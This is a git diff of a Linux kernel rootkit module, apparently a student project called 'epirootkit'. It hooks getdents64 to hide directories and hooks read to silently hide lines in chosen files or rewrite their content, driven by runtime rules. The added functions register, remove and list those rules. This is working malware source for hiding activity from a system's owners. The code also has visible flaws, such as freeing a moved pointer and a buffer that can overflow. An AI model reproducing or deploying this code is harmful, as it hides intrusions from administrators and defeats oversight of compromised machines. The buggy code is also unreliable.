@@ -1,10 +1,19 @@
 #include <linux/file.h>
+#include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
+#include <linux/file.h>
 
 #include "epirootkit.h"
+
+// C'EST LE BORDEL, A COMMENTER, TRIER ET ORGANISER PROCHAINEMENT
+// PTET AMELIORER : 
+//  - possibilite d'avoir plusieurs lignes caches
+//  - possibilite d'avoir plusieurs rules de replacement
+//  - possiblite d'avoir plusieurs rules de keyword a cacher
+//  - fuck le qwerty
 
 /*
  * regs->di       <- RDI <- 1st argument (so the file descriptor for read)
@@ -25,6 +34,15 @@ struct linux_dirent64 {
     char d_name[];
 };
 
+struct modified_file {
+    char *file_path;
+    int hide_line_with_number;
+    char *hide_line_with_substring;
+    char *replace_src;
+    char *replace_dst;
+    struct list_head list;
+};
+
 // Structure to hold hidden directory names
 struct hidden_dir_entry {
     char *dirname;
@@ -32,7 +50,9 @@ struct hidden_dir_entry {
 };
 
 static LIST_HEAD(hidden_dirs_list);
+static LIST_HEAD(modified_files_list);
 static DEFINE_SPINLOCK(hidden_dirs_lock);
+static DEFINE_SPINLOCK(modified_files_lock);
 
 // Function prototypes
 int add_hidden_dir(const char *dirname);
@@ -215,7 +235,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
         // Build full path to be more precise than before
         bool hide = false;
         if (dirstr) {
-            char fullpath[1024];
+            char fullpath[512];
             int len;
 
             if (strcmp(dirstr, "/") == 0) {
@@ -252,49 +272,40 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
-#define FILTER_FILE "/test.txt"
-#define HIDE_LINE_NUMBER 3
-#define HIDE_SUBSTRING "SECRET"
-#define REPLACE_SRC "efrei"
-#define REPLACE_DST "epita"
-
 static asmlinkage long (*__orig_read)(const struct pt_regs *regs);
 static asmlinkage long read_hook(const struct pt_regs *regs);
 
-static bool is_target_file(int fd) {
-    struct file *f;
-    struct path path;
-    char *tmp;
-    bool tinder_match = false;
-    char buf[1024];
-
-    f = fget(fd);
-    if (!f)
-        return false;
-
-    path = f->f_path;
-    path_get(&path);
-    tmp = d_path(&path, buf, sizeof(buf));
-    if (!IS_ERR(tmp) && strcmp(tmp, FILTER_FILE) == 0)
-        tinder_match = true;
-
-    path_put(&path);
-    fput(f);
-    return tinder_match;
-}
-
 asmlinkage long read_hook(const struct pt_regs *regs) {
-    // Call the original read syscall first
     long ret = __orig_read(regs);
     if (ret <= 0)
         return ret;
 
-    // Check if the file descriptor is the one we want to filter
+    // Resolve fd absolute path
     int fd = regs->di;
-    if (!is_target_file(fd))
+    struct file *f = fget(fd);
+    if (!f)
+        return ret;
+    struct path p = f->f_path;
+    path_get(&p);
+    char buf[PATH_MAX];
+    char *fullpath = d_path(&p, buf, sizeof(buf));
+    path_put(&p);
+    fput(f);
+    if (IS_ERR(fullpath))
         return ret;
 
-    // Copy user buffer to kernel
+    // Look up rule for this path
+    struct modified_file *rule = NULL, *m;
+    spin_lock(&modified_files_lock);
+    list_for_each_entry(m, &modified_files_list, list) if (strcmp(fullpath, m->file_path) == 0) {
+        rule = m;
+        break;
+    }
+    spin_unlock(&modified_files_lock);
+    if (!rule)
+        return ret;
+
+    // Copy user buffer to kernel space
     char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
     if (!kbuf)
         return ret;
@@ -302,76 +313,126 @@ asmlinkage long read_hook(const struct pt_regs *regs) {
         kfree(kbuf);
         return ret;
     }
-
-    // Safety null-terminate the buffer
-    // (not sure if this is needed, but better safe than sorry)
     kbuf[ret] = '\0';
 
-    // Prepare output buffer (we double the output just in case replacement string is longer)
-    // Maybe not the best solution... to improve later
+    // Allocate a new buffer for the modified content, times 2, no other idea for the moment
     char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
     if (!out) {
         kfree(kbuf);
         return ret;
     }
-    char *line;
-    int line_number = 0;
+
+    int line_no = 0;
     size_t out_len = 0;
-
-    line = strsep(&kbuf, "\n");
-
-    while (line) {
-        line_number++;
+    char *line;
+    while ((line = strsep(&kbuf, "\n"))) {
         bool skip = false;
-        char *p;
+        line_no++;
 
-        // Hide a line
-        if (HIDE_LINE_NUMBER > 0 && line_number == HIDE_LINE_NUMBER)
+        // HIde line by number
+        if (rule->hide_line_with_number && line_no == rule->hide_line_with_number)
             skip = true;
 
-        // Hide a line from keyword
-        if (!skip && HIDE_SUBSTRING && strstr(line, HIDE_SUBSTRING))
+        // Hide line by substring
+        if (!skip && rule->hide_line_with_substring && strstr(line, rule->hide_line_with_substring))
             skip = true;
 
-        // Hide a keyword and replace it by something else
-        if (!skip) {
-            char *seg = line;
-            while ((p = strstr(seg, REPLACE_SRC))) {
-                // Copy up to matching string
-                size_t distance_before = p - seg;
-                memcpy(out + out_len, seg, distance_before);
-                out_len += distance_before;
+        // Replace substring
+        if (!skip && rule->replace_src) {
+            char *seg = line, *p2;
+            while ((p2 = strstr(seg, rule->replace_src))) {
+                // First part of the line
+                size_t before = p2 - seg;
+                memcpy(out + out_len, seg, before);
+                out_len += before;
 
-                // Copy replacement string
-                size_t len_string_src = strlen(REPLACE_SRC);
-                size_t len_string_dst = strlen(REPLACE_DST);
-                memcpy(out + out_len, REPLACE_DST, len_string_dst);
-                out_len += len_string_dst;
-                seg = p + len_string_src;
+                // Replace substring
+                memcpy(out + out_len, rule->replace_dst, strlen(rule->replace_dst));
+                out_len += strlen(rule->replace_dst);
+                seg = p2 + strlen(rule->replace_src);
             }
 
-            // Copy remainder string
+            // Copy the rest of the line
             strcpy(out + out_len, seg);
             out_len += strlen(seg);
-
-            // Add newline back
             out[out_len++] = '\n';
+            continue;
         }
 
-        line = strsep(&kbuf, "\n");
+        // Copy original line if not skipped
+        if (!skip) {
+            memcpy(out + out_len, line, strlen(line));
+            out_len += strlen(line);
+            out[out_len++] = '\n';
+        }
     }
-
     out[out_len] = '\0';
 
-    // Copy filtered data back to user
-    if (copy_to_user((char __user *)regs->si, out, out_len))
-        ret = ret;
-    else
+    // Write back to user space
+    if (!copy_to_user((char __user *)regs->si, out, out_len))
         ret = out_len;
 
     kfree(out);
     kfree(kbuf);
     return ret;
+}
+
+int add_modified_file(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst) {
+    struct modified_file *m;
+    m = kmalloc(sizeof(*m), GFP_KERNEL);
+    if (!m)
+        return -ENOMEM;
+
+    m->file_path = kstrdup(path, GFP_KERNEL);
+    m->hide_line_with_number = hide_line;
+    m->hide_line_with_substring = hide_substr ? kstrdup(hide_substr, GFP_KERNEL) : NULL;
+    m->replace_src = src ? kstrdup(src, GFP_KERNEL) : NULL;
+    m->replace_dst = dst ? kstrdup(dst, GFP_KERNEL) : NULL;
+
+    spin_lock(&modified_files_lock);
+    list_add_tail(&m->list, &modified_files_list);
+    spin_unlock(&modified_files_lock);
+
+    DBG_MSG("hooks: added modified_file rule for %s\n", path);
+    return 0;
+}
+
+int remove_modified_file(const char *path) {
+    struct modified_file *m, *tmp;
+    int found = 0;
+    spin_lock(&modified_files_lock);
+    list_for_each_entry_safe(m, tmp, &modified_files_list, list) {
+        if (strcmp(m->file_path, path) == 0) {
+            list_del(&m->list);
+            kfree(m->file_path);
+            kfree(m->hide_line_with_substring);
+            kfree(m->replace_src);
+            kfree(m->replace_dst);
+            kfree(m);
+            found = 1;
+            break;
+        }
+    }
+    spin_unlock(&modified_files_lock);
+    return found ? 0 : -ENOENT;
+}
+
+int list_modified_files(char *buf, size_t size) {
+    struct modified_file *m;
+    size_t len = 0;
+    spin_lock(&modified_files_lock);
+    list_for_each_entry(m, &modified_files_list, list) {
+        len += scnprintf(buf + len, size - len, "%s hide_line=%d hide_substr=%s replace=%s->%s\n",
+                         m->file_path,
+                         m->hide_line_with_number,
+                         m->hide_line_with_substring ?: "none",
+                         m->replace_src ?: "none",
+                         m->replace_dst ?: "none");
+        if (len >= size - 1)
+            break;
+    }
+    spin_unlock(&modified_files_lock);
+    return len;
 }
 
 // Array of hooks to install.
